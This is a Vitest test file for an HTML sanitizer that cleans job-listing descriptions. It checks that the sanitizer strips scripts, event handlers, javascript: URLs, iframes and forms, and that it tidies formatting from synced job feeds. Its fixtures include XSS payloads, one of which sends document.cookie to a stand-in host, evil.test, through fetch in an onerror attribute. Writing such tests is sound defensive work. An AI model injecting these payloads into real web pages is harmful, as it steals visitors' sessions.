import { describe, it, expect } from 'vitest'
import { sanitizeDescription, sanitizeSyncedDescription } from './sanitize'

describe('sanitizeDescription', () => {
  it('returns an empty string for missing input', () => {
    expect(sanitizeDescription(null)).toBe('')
    expect(sanitizeDescription(undefined)).toBe('')
    expect(sanitizeDescription('')).toBe('')
  })

  it('keeps the formatting the editor can produce', () => {
    const html =
      '<h2>Role</h2><p><strong>Lead</strong> the <em>team</em>.</p>' +
      '<ul><li>One</li><li>Two</li></ul><blockquote>Quote</blockquote><hr>'
    expect(sanitizeDescription(html)).toBe(html)
  })

  it('keeps links and images with their attributes', () => {
    const html = '<p><a href="https://example.com" title="x">Apply</a></p>'
    expect(sanitizeDescription(html)).toContain('href="https://example.com"')

    const img = '<img src="https://example.com/logo.png" alt="Logo">'
    expect(sanitizeDescription(img)).toContain('src="https://example.com/logo.png"')
  })

  // ── the actual vulnerability ──────────────────────────────────────────────

  it('strips script tags', () => {
    const out = sanitizeDescription('<p>Hi</p><script>alert(1)</script>')
    expect(out).not.toContain('script')
    expect(out).toContain('<p>Hi</p>')
  })

  it('strips event-handler attributes', () => {
    // The payload an admin cannot see while reviewing rendered output.
    const out = sanitizeDescription('<img src=x onerror="alert(1)">')
    expect(out).not.toContain('onerror')

    expect(sanitizeDescription('<p onclick="alert(1)">t</p>')).not.toContain('onclick')
    expect(sanitizeDescription('<div onload="alert(1)">t</div>')).not.toContain('onload')
  })

  it('strips javascript: URLs', () => {
    const out = sanitizeDescription('<a href="javascript:alert(1)">click</a>')
    expect(out).not.toContain('javascript:')
  })

  it('strips iframes, objects and embeds', () => {
    const out = sanitizeDescription(
      '<iframe src="https://evil.test"></iframe><object data="x"></object><embed src="x">'
    )
    expect(out).not.toContain('iframe')
    expect(out).not.toContain('object')
    expect(out).not.toContain('embed')
  })

  it('strips style and form elements', () => {
    expect(sanitizeDescription('<style>body{display:none}</style>')).not.toContain('style')
    const form = sanitizeDescription('<form action="https://evil.test"><input name="p"></form>')
    expect(form).not.toContain('<form')
    expect(form).not.toContain('<input')
  })

  it('forces rel="noopener noreferrer" on links that open a new tab', () => {
    // Without this, the opened page gets a handle on window.opener.
    const out = sanitizeDescription('<a href="https://example.com" target="_blank">x</a>')
    expect(out).toContain('rel="noopener noreferrer"')
  })

  it('survives the approve-route path: submitted HTML stays inert', () => {
    // What a malicious submitter would send, end to end.
    const payload =
      '<p>Great role!</p><img src=x onerror="fetch(\'https://evil.test?c=\'+document.cookie)">'
    const out = sanitizeDescription(payload)
    expect(out).toContain('<p>Great role!</p>')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('evil.test')
  })
})

describe('sanitizeSyncedDescription', () => {
  it('returns an empty string for missing input', () => {
    expect(sanitizeSyncedDescription(null)).toBe('')
    expect(sanitizeSyncedDescription('')).toBe('')
  })

  it('turns headings into bold paragraphs', () => {
    expect(sanitizeSyncedDescription('<h1>About</h1><h2>The role</h2><h3>You</h3>')).toBe(
      '<p><strong>About</strong></p><p><strong>The role</strong></p><p><strong>You</strong></p>'
    )
  })

  it('does not double-wrap a heading that is already bold', () => {
    expect(sanitizeSyncedDescription('<h2><strong>THE TEAM</strong></h2>')).toBe('<p><strong>THE TEAM</strong></p>')
  })

  it('removes empty paragraphs (Ticketmaster via Workday)', () => {
    const html = '<p>Job Summary:</p><h2>THE TEAM</h2><p>&nbsp;</p><p>&nbsp;</p><p></p><p><br></p><p>The Marketing team.</p>'
    expect(sanitizeSyncedDescription(html)).toBe('<p>Job Summary:</p><p><strong>THE TEAM</strong></p><p>The Marketing team.</p>')
  })

  it('drops the leading &nbsp; feeds indent paragraphs with (ANZ)', () => {
    expect(sanitizeSyncedDescription('<p>&nbsp;We are now inviting&nbsp;<strong>interns</strong>.</p>')).toBe(
      '<p> We are now inviting <strong>interns</strong>.</p>'
    )
  })

  it('turns LinkedIn <br><br> gaps into paragraphs', () => {
    const html =
      '<strong>Description<br><br></strong>We are looking for students.<br><br>Key job responsibilities<br><br>' +
      '<ul><li> Work alongside our team.</li></ul>'
    expect(sanitizeSyncedDescription(html)).toBe(
      '<p><strong>Description</strong></p><p>We are looking for students.</p><p>Key job responsibilities</p>' +
        '<ul><li> Work alongside our team.</li></ul>'
    )
  })

  it('splits a paragraph at a <br><br> gap but keeps a single line break', () => {
    expect(sanitizeSyncedDescription('<p>One<br>two<br> <br>three<br></p>')).toBe('<p>One<br>two</p><p>three</p>')
  })

  it('collapses a <br> gap inside a list item to one line break', () => {
    expect(sanitizeSyncedDescription('<ul><li>One<br><br><br>two<br></li></ul>')).toBe('<ul><li>One<br>two</li></ul>')
  })

  it('merges one-bullet lists that ANZ spaces apart', () => {
    const html = '<ul>\n<li>One</li>\n</ul>\n<p>&nbsp;</p>\n<ul>\n<li>Two</li>\n</ul>\n<p>&nbsp;</p>\n<p>After</p>'
    expect(sanitizeSyncedDescription(html).replace(/\n/g, '')).toBe('<ul><li>One</li><li>Two</li></ul><p>After</p>')
  })

  it('keeps lists, links and images', () => {
    const html = '<p>See <a href="https://example.com">the site</a>.</p><ul><li>A</li></ul><p><img src="https://example.com/a.png" alt="A"></p>'
    expect(sanitizeSyncedDescription(html)).toBe(html)
  })

  it('still sanitises', () => {
    const out = sanitizeSyncedDescription('<h2 onclick="x()">Hi</h2><script>alert(1)</script><img src=x onerror=alert(1)>')
    expect(out).not.toContain('script')
    expect(out).not.toContain('onerror')
    expect(out).not.toContain('onclick')
  })

  it('is idempotent', () => {
    const html = '<strong>Description<br><br></strong>Text<br><br><h2>Next</h2><p>&nbsp;</p><p>More<br>lines</p>'
    const once = sanitizeSyncedDescription(html)
    expect(sanitizeSyncedDescription(once)).toBe(once)
  })
})
